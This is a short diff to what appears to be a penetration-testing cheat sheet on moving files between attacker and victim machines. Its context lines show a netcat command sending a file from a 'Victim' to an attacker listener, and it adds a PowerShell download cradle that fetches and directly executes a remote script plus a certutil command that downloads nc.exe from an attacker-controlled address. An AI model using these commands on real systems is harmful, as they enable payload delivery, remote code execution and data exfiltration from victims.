@@ -36,3 +36,15 @@ sudo nc -l -p 999 > file
 On Victim
 nc.exe -w 5 MYIP 999 < file
 ```
+
+## Powershell
+
+```bash
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"  // directly execute command
+```
+
+## certutil
+
+```bash
+certutil -urlcache -f http://10.9.53.25:8000/nc.exe nc.exe
+```
